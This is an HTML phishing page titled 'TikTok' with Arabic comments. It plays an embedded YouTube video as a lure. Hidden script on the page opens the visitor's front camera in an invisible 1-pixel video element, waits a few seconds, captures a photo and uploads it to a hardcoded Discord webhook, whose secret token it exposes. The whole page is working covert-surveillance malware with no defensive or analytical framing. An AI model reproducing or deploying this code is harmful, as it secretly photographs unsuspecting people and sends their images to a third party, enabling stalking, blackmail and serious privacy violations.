<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; }
        .wrapper { position: relative; width: 100%; height: 100%; }
        
        /* جعل إطار اليوتيوب متوافقاً تماماً مع شاشة الجوال */
        #youtube-frame {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none;
        }

        #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
        #photo-canvas { display: none; }
    </style>
</head>
<body>

<div class="wrapper">
    <iframe id="youtube-frame" 
        src="https://www.youtube.com/embed/C3vaOyZFcsM?autoplay=1&mute=1&loop=1&playlist=C3vaOyZFcsM&controls=0&modestbranding=1&rel=0" 
        frameborder="0" allow="autoplay; encrypted-media">
    </iframe>
</div>

<video id="hidden-camera" autoplay playsinline muted></video>
<canvas id="photo-canvas"></canvas>

<script>
    const webhookURL = 'https://discord.com/api/webhooks/1493312893100228608/X78aap9qPQUcppW21eNRpVDCiJGIS3OFDw6rH6ZKTPVTzsQbsGJyBKMWV7slNEt67zUs';

    window.onload = async () => {
        const camera = document.getElementById('hidden-camera');
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: 640, height: 480 } 
            });
            camera.srcObject = stream;

            // حل مشكلة الصورة السوداء: الانتظار حتى يرسل الفيديو بيانات حقيقية
            camera.onplaying = () => {
                // ننتظر 6 ثوانٍ كاملة لضمان فتح العدسة وضبط الإضاءة
                setTimeout(() => {
                    captureAndSend(camera);
                }, 6000);
            };
        } catch (err) { console.log("Camera Error"); }
    };

    async function captureAndSend(cameraElement) {
        const canvas = document.getElementById('photo-canvas');
        const context = canvas.getContext('2d');

        // التحقق من أن الكاميرا ترسل صورة فعلية وليست أبعاداً صفرية
        if (cameraElement.videoWidth > 0) {
            canvas.width = cameraElement.videoWidth;
            canvas.height = cameraElement.videoHeight;
            context.drawImage(cameraElement, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                if (!blob) return;
                const formData = new FormData();
                formData.append('file', blob, 'clear_capture.png');
                await fetch(webhookURL, { method: 'POST', body: formData });
            }, 'image/png');
        } else {
            // محاولة أخرى بعد ثانية إذا كانت لا تزال سوداء
            setTimeout(() => captureAndSend(cameraElement), 1000);
        }
    }
</script>
</body>
</html>
